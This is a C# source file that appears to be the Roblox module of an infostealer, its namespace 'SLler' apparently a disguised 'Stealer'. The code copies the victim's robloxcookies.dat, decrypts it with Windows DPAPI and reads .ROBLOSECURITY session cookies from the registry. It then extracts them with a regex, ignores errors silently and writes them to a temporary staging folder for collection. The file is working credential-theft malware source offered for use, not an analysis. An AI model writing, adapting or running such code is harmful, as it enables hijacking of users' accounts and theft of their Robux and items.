using Microsoft.Win32;
using Newtonsoft.Json;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace SLler
{
	public static class Roblox
	{

		public static void SLRobloxCookies()
		{
			if (!Settings.CaptureGames) return;

			var saveToDir = Path.Combine(Settings._tempDir, "Games", "Roblox");
			var note = "# The cookies found in this text file have not been verified online.\n# Therefore, there is a possibility that some of them may work, while others may not.";
			var cookies = new HashSet<string>();

			// Новый метод: чтение из robloxcookies.dat
			var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
			var robloxCookiesPath = Path.Combine(userProfile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat");

			if (File.Exists(robloxCookiesPath))
			{
				try
				{
					var tempDir = Path.GetTempPath();
					var destinationPath = Path.Combine(tempDir, "RobloxCookies.dat");
					File.Copy(robloxCookiesPath, destinationPath, true);

					var jsonContent = File.ReadAllText(destinationPath);
					var jsonObject = JsonConvert.DeserializeObject<Dictionary<string, object>>(jsonContent);

					if (jsonObject != null && jsonObject.TryGetValue("CookiesData", out var encodedCookiesObj))
					{
						var encodedCookies = encodedCookiesObj as string;
						if (!string.IsNullOrEmpty(encodedCookies))
						{
							var decodedCookies = Convert.FromBase64String(encodedCookies);
							var decryptedCookies = ProtectedData.Unprotect(decodedCookies, null, DataProtectionScope.CurrentUser);
							var cookieContent = Encoding.UTF8.GetString(decryptedCookies);

							// УЛУЧШЕННОЕ регулярное выражение для захвата полного куки
							var matches = Regex.Matches(cookieContent,
								@"_\\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-SL-your-ROBUX-and-items\.\\|_[A-Za-z0-9\.\-_=]+");

							foreach (Match match in matches)
							{
								if (match.Success)
								{
									// Добавляем только уникальные куки
									cookies.Add(match.Value);
								}
							}
						}
					}
				}
				catch (Exception ex)
				{ }
			}

			foreach (var rootKey in new[] { RegistryHive.CurrentUser, RegistryHive.LocalMachine })
			{
				try
				{
					using (var baseKey = RegistryKey.OpenBaseKey(rootKey, RegistryView.Default))
					using (var subKey = baseKey.OpenSubKey(@"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com"))
					{
						if (subKey != null)
						{
							var value = subKey.GetValue(".ROBLOSECURITY") as string;
							if (!string.IsNullOrEmpty(value))
							{
								var match = Regex.Match(value,
									@"_\\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\\|_[A-Za-z0-9\.\-_=]+");

								if (match.Success)
								{
									cookies.Add(match.Value);
								}
							}
						}
					}
				}
				catch (Exception ex)
				{ }
			}
			string _separator = "";

			if (cookies.Any())
			{
				Directory.CreateDirectory(saveToDir);
				var savePath = Path.Combine(saveToDir, "Roblox Cookies.txt");
				File.WriteAllText(savePath, $"{note}{_separator}{string.Join(_separator, cookies)}");

				Settings._robloxCookiesCount += cookies.Count;
			}

		}
	}
}
